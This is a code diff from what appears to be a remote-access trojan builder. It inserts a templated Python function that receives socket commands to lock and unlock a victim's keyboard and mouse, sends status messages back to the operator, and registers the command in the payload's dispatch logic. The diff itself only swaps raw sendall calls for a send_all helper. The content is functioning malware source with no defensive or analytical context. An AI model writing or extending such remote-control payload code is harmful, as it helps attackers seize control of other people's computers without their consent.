@@ -49,27 +49,27 @@ def interface_locker(data):
     global keylock
     global mouselock
     if data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key' and keylock:
-        s.sendall('[-]Keyboard is already locked'.encode())
+        send_all(s,'[-]Keyboard is already locked')
     elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse' and mouselock:
-        s.sendall('[-]Mouse is already locked'.encode())
+        send_all(s,'[-]Mouse is already locked')
     elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key':
         keylock = True
         t = threading.Thread(target=key_lock,args=(),)
         t.start()
-        s.sendall('[+]Locked keyboard interface'.encode())
+        send_all(s,'[+]Locked keyboard interface')
     elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse':
         mouselock = True
         t = threading.Thread(target=mouse_lock,args=(),)
         t.start()
-        s.sendall('[+]Locked mouse interface'.encode())
+        send_all(s,'[+]Locked mouse interface')
     elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'key':
         keylock = False
-        s.sendall('[+]Unlocked keyboard interface'.encode())
+        send_all(s,'[+]Unlocked keyboard interface')
     elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'mouse':
         mouselock = False
-        s.sendall('[+]Unlocked mouse interface'.encode())
+        send_all(s,'[+]Unlocked mouse interface')
     else:
-        s.sendall('[-]Please specify valid interface, key/mouse, to lock/unlock'.encode())''')
+        send_all(s,'[-]Please specify valid interface, key/mouse, to lock/unlock')''')
         config.logics.append('''
             elif command in ('inter_lock','inter_unlock'):
                 interface_locker(data)''')
